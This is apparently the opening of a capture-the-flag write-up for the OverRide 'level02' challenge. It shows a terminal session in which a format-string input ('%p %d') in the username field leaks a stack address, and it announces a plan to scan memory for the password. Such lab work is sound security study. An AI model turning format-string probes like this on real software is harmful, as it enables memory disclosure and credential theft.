# level 02

For the first time we have a x64 program that reads the password file and then check the user input against it to give a shell.

It also calls printf with a format string the user controls.
```shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: rewrite it in %p %d
--[ Password: javascript
*****************************************
rewrite it in 0x7fffffffe4d0 0 does not have access!
```

Let's scan the memory to find the password
